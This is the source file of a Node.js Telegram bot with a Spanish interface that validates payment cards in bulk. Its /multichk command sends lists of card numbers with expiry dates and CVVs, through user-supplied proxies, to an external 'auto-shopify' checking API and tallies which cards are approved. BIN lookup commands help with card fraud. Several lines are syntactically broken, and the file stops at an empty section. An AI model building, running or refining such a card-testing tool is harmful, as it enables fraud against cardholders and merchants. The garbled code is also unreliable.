require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');

/* ================== ENV ================== */
const BOT_TOKEN = process.env.BOT_TOKEN;
const API_BASE = 'https://auto-shopify-api-production.up.railway.app/index.php';

if (!BOT_TOKEN) {
  console.error('BOT_TOKEN no definido');
  process.exit(1);
}

/* ================== BOT ================== */
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

/* ================== DATA ================== */
const DATA_FILE = './data.json';
let data = loadData();
const running = {}; // runtime only

function loadData() {
  if (fs.existsSync(DATA_FILE)) {
    return JSON.parse(fs.readFileSync(DATA_FILE));
  }
  return { sites: [], proxies: [], bins: [] };
}

function saveData() {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

/* ================== API ================== */
async function callChkAPI({ site, cc, proxy }) {
  try {
    const res = await axios.get(API_BASE, {
      params: { site, cc, proxy },
      timeout: 30000
    });

    const d = res.data  {};
    const response = String(d.Response  '').toUpperCase();

    return {
      approved: response.includes('APPRO'),
      response,
      gateway: d.Gateway  'N/A',
      price: d.Price  'N/A',
      cc
    };
  } catch {
    return { approved: false, response: 'API_ERROR', cc };
  }
}

/* ================== START ================== */
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
🤖 Bot activo

Comandos:
/addsites
/addproxies
/status
/multichk <cc|mm|yy|cvv>
/stop
/bininfo <bin>
/genbins
/checkbin <bin>
/listbins
/addbin <bin>
/removebin <bin>
/updatebin <bin> <new_info>
  );
});

/* ================== STATUS ================== */
bot.onText(/\/status/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
    🌐 Sites: ${data.sites.length}\n🧰 Proxies: ${data.proxies.length}\n🔹 Bins: ${data.bins.length}
  );
});

/* ================== ADD SITES ================== */
bot.onText(/\/addsites([\s\S]*)/, (msg, match) => {
  const input = match[1]?.trim();
  if (!input) return bot.sendMessage(msg.chat.id, 'Envía sites en líneas');

  const lines = input.split('\n').map(x => x.trim()).filter(Boolean);
  let added = 0;

  for (const site of lines) {
    if (!data.sites.includes(site)) {
      data.sites.push(site);
      added++;
    }
  }

  saveData();
  bot.sendMessage(msg.chat.id, 🌐 Sites añadidos: ${added});
});

/* ================== ADD PROXIES ================== */
bot.onText(/\/addproxies([\s\S]*)/, (msg, match) => {
  const input = match[1]?.trim();
  if (!input) return bot.sendMessage(msg.chat.id, 'Envía proxies en líneas');

  const lines = input.split('\n').map(x => x.trim()).filter(Boolean);
  let added = 0;

  for (const proxy of lines) {
    if (!data.proxies.includes(proxy)) {
      data.proxies.push(proxy);
      added++;
    }
  }

  saveData();
  bot.sendMessage(msg.chat.id, 🧰 Proxies añadidos: ${added});
});

/* ================== MULTICHK ================== */
bot.onText(/\/multichk([\s\S]*)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!data.sites.length || !data.proxies.length) {
    return bot.sendMessage(chatId, '❌ Agrega sites y proxies primero');
  }

  const input = match[1]?.trim();
  if (!input) return bot.sendMessage(chatId, 'Envía CCs');

  const ccs = input.split('\n').map(x => x.trim()).filter(Boolean);

  running[chatId] = true;

  let approved = 0;
  let declined = 0;
  let errors = 0;

  const progress = await bot.sendMessage(chatId, ⏳ 0/${ccs.length});

  for (let i = 0; i < ccs.length; i++) {
    if (!running[chatId]) break;

    const r = await callChkAPI({
      site: data.sites[0],
      cc: ccs[i],
      proxy: data.proxies[0]
    });

    if (r.approved) approved++;
    else if (r.response === 'DECLINE') declined++;
    else errors++;

    await bot.editMessageText(
      ⏳ ${i + 1}/${ccs.length}\n✅ ${approved} ❌ ${declined} ⚠️ ${errors},
      { chat_id: chatId, message_id: progress.message_id }
    );
  }

  running[chatId] = false;

  bot.sendMessage(
    chatId,
    ✅ Finalizado\nAprobadas: ${approved}\nRechazadas: ${declined}\nErrores: ${errors}
  );
});

/* ================== STOP ================== */
bot.onText(/\/stop/, (msg) => {
  const chatId = msg.chat.id;
  if (running[chatId]) {
    running[chatId] = false;
    bot.sendMessage(chatId, '✋ Proceso detenido.');
  } else {
    bot.sendMessage(chatId, '❌ No hay ningún proceso en ejecución.');
  }
});

/* ================== ADD CONFIG ================== */
bot.onText(/\/addconfig([\s\S]*)/, (msg, match) => {
  const input = match[1];
  if (!input || !input.includes('[SITES]') || !input.includes('[PROXIES]')) {
    return bot.sendMessage(
      msg.chat.id,
      '❌ Formato incorrecto\n\nEjemplo:\n/addconfig\n[SITES]\nhttps://site1.com\n\n[PROXIES]\nip:port:user:pass'
    );
  }

  const sitesBlock = input.split('[SITES]')[1].split('[PROXIES]')[0];
  const proxiesBlock = input.split('[PROXIES]')[1];

  const sites = sitesBlock.split('\n').map(x => x.trim()).filter(Boolean);
  const proxies = proxiesBlock.split('\n').map(x => x.trim()).filter(Boolean);

  let addedSites = 0;
  let addedProxies = 0;

  for (const site of sites) {
    if (!data.sites.includes(site)) {
      data.sites.push(site);
      addedSites++;
    }
  }

  for (const proxy of proxies) {
    if (!data.proxies.includes(proxy)) {
      data.proxies.push(proxy);
      addedProxies++;
    }
  }

  saveData();
  bot.sendMessage(
    msg.chat.id,
    `🌐 Sites añadidos: ${addedSites}\n🧰 Proxies añadidos: ${addedProxies}\nTotal Sites: ${data.sites.length}\nTotal Proxies: ${data.proxies.length}`
  );
});

/* ================== BIN INFO ================== */
bot.onText(/\/bininfo([\s\S]*)/, async (msg, match) => {
  const bin = match[1]?.trim();
  if (!bin) return bot.sendMessage(msg.chat.id, 'Envía un bin para obtener información');

  try {
    const response = await axios.get(`https://api.binlist.net/${bin}`);
    const data = response.data;

    const info = `
🔹 País: ${data.country.name}
🔹 Banco: ${data.bank.name}
🔹 Tipo: ${data.type}
🔹 Nivel: ${data.scheme}
🔹 Prefijo: ${data.prefix}
    `;

    bot.sendMessage(msg.chat.id, info);
  } catch (error) {
    bot.sendMessage(msg.chat.id, '❌ Error al obtener información del bin');
  }
});

/* ================== GENERATE BINS ================== */
bot.onText(/\/genbins/, async (msg) => {
  try {
    const response = await axios.get('https://api.binlist.net/v1/');
    const data = response.data;

    const bins = data.bins.map(bin => bin).join('\n');
    bot.sendMessage(msg.chat.id, `🔹 Bins generados:\n${bins}`);
  } catch (error) {
    bot.sendMessage(msg.chat.id, '❌ Error al generar bins');
  }
});

/* ================== CHECK BIN ================== */
